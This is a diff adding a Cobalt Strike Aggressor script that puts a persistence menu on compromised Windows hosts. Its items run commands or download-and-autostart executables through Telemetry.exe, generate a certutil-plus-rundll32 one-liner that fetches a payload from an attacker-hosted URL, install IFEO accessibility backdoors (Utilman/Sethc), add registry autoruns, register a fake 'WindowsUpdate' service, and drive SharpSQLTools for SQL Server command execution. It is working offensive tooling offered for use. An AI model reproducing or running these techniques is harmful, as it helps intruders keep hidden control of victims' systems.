@@ -1,0 +1,206 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+menu "权限维持" {
+
+	    menu "\"遥测\"计划任务" {
+					item "无文件执行命令" {
+			$bid = $1['@'];
+			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
+			dialog_description($dialog, "输入cmd命令，cmd /s 后面的内容，执行方式：Telemetry.exe install /command:calc");
+			drow_text($dialog, "command", "command:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Telemetry_cmd {
+		$arg = join('', @("install /command:",$3['command']));
+		bexecute_assembly($bid, script_resource("/script/Telemetry.exe"), $arg);
+}
+
+					item "远程下载文件自启" {
+			$bid = $1['@'];
+			$dialog = dialog("Telemetry", %(url => "",bid => $bid), &Telemetry_url);
+			dialog_description($dialog, "输入exe下载地址，执行方式：Telemetry.exe install /url:http://vps:8089/System.exe");
+			drow_text($dialog, "url", "url:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Telemetry_url {
+		$arg = join('', @("install /url:",$3['url']));
+		bexecute_assembly($bid, script_resource("/script/Telemetry.exe"), $arg);
+}
+		
+		}
+			
+
+
+	item "CertUtil Web Delivery" {
+		local('$dialog %defaults');
+
+		%defaults["uri"]  = "/test.dll";
+		%defaults["host"] = localip();
+		%defaults["port"] = 80;
+
+		$dialog = dialog("CertUtil Web Delivery (Stageless)", %defaults, &stage_attack);
+		dialog_description($dialog, "生成payload使用ccertutil远程下载，然后使用rundll32.exe执行");
+		drow_text($dialog, "uri", "URI Path: ", 20);
+		drow_text($dialog, "host", "Local Host: ");
+		drow_text($dialog, "port", "Local Port: ");
+		drow_listener_stage($dialog, "listener", "Listener: ");
+		drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+		dbutton_action($dialog, "Launch");
+
+		dialog_show($dialog);
+	}
+sub stage_attack {
+	local('%options $script $url $arch');
+	%options = $3;
+
+	$arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+	artifact_stageless(%options["listener"], "dll", $arch, $null, $this);
+	yield;
+
+	$script = $1;
+
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "automatic", "Scripted Web Delivery (CertUtil)"); 
+
+	prompt_text("Copy/Paste One-liner: ", "powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
+	show_message("Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)");
+	elog("powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");
+
+}
+
+   
+                item "映像劫持"{
+                    if (!-isadmin $1['@']){
+                        show_error("权限不足");
+                    }
+                    else{
+                        $bid = $1['@'];
+                        $Dialog = dialog("IFEO",%(Type => "Utilman", CallBackFile => "c:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallBackDoor);
+                        dialog_description($Dialog, "使用映像劫持安装后门(IFEO)");
+                        drow_combobox($Dialog,"Type","Type: ", @("Utilman", "Sethc"));
+                        drow_text($Dialog,"CallBackFile","CallBackFile: ");
+                        dbutton_action($Dialog, "Run");
+                        dialog_show($Dialog);
+                        
+                    }
+                }
+
+                item "注册表添加启动项"{
+                    if (!-isadmin $1['@']){
+                        show_error("权限不足");
+                    }
+                    else{
+                        $bid = $1['@'];
+                        $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
+                        dialog_description($Dialog, "注册表添加启动项");
+                        drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
+                        drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
+                        drow_text($Dialog, "CallBackFile", "CallBackFile: ");
+                        dbutton_action($Dialog, "Reg");
+                        dialog_show($Dialog);
+                    }
+                }
+
+
+                item "注册服务"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallService);
+                    dialog_description($Dialog, "将可执行文件注册为服务");
+                    drow_text($Dialog, "SerName", "Service Name: ");
+                    drow_text($Dialog, "Path", "Bin Path: ");
+                    dbutton_action($Dialog, "Install");
+                    dialog_show($Dialog);
+                }
+    
+		sub InstallBackDoor{
+    local('$Prefix $File');
+    $Prefix = "\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
+    $File = replace($3['CallBackFile'], "\"", "");
+    if ($3['Type'] eq "Utilman"){
+        $Prefix = $Prefix."Utilman.exe\"";
+        bshell($bid,"reg add  $+ $Prefix /f");
+        bshell($bid,"reg add  $+ $Prefix /v Debugger /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    else if($3['Type'] eq "Sethc"){
+        $Prefix = $Prefix."Sethc.exe\"";
+        bshell($bid,"reg add  $+ $Prefix /f");
+        bshell($bid,"reg add  $+ $Prefix /v Debugger /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    
+}
+
+
+sub InstallAutoRun{
+    local('$Prefix $File $Key $Item $Reg');
+    $Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
+    $File = replace($3['CallBackFile'], "\"", "");
+    $Key = "\"".$3['RegKey'];
+    $Item = $3['RegItem']."\"";
+    if($3['RegItem'] eq "Winlogon"){
+        $Prefix = replace($Prefix,'Windows',"Windows NT");
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe, $+ $File \" /f ");
+    }
+    else if($3['RegItem'] eq "Logon Scripts"){
+        bshell($bid,"reg add  \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    else{
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /f");
+        bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
+    }
+}
+
+
+sub InstallSchedule{
+    
+}
+
+sub InstallService{
+    local('$Name $Path');
+    $Name = $3['SerName'];
+    $Path = replace($3['Path'], "\"", "");
+    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+}
+			item "SharpSQLTools" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
+			dialog_description($dialog, "命令行版SQLTools");
+			drow_text($dialog, "host", "host:  ");	
+			drow_text($dialog, "username", "username:  ");	
+			drow_text($dialog, "password", "password:  ");			
+			drow_combobox($dialog, "type", "-xp/-sp", @("-xp", "-sp"));
+			drow_combobox($dialog, "enable", "enable", @("None", "enable"));
+			drow_text($dialog, "cmd", "cmd:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpSQLTools {
+	if($3['enable'] =~ "enable"){
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],$3['enable']));
+		bexecute_assembly($bid, script_resource("/script/SharpSQLTools.exe"), $arg);
+		}
+	else
+	{
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],"-c","$3['cmd']"));
+		bexecute_assembly($bid, script_resource("/script/SharpSQLTools.exe"), $arg);
+		}
+}		
+		
+		
+		
+		}
+
+	
+
+
+
